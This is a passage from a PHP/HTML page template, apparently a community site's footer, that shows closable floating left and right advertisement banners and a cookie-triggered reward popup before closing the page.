<div id="uch_couplet" style="z-index: 10; position: absolute; display:none">
<div id="couplet_left" style="position: absolute; left: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<div id="couplet_rigth" style="position: absolute; right: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<script type="text/javascript">
lsfloatdiv('uch_couplet', 0, 0, '', 0).floatIt();
</script>
</div>
<?php } ?>
<?php if($_SCOOKIE['reward_log']) { ?>
<script type="text/javascript">
showreward();
</script>
<?php } ?>
<br>
</body>
</html>
<?php } ?><?php ob_out();?>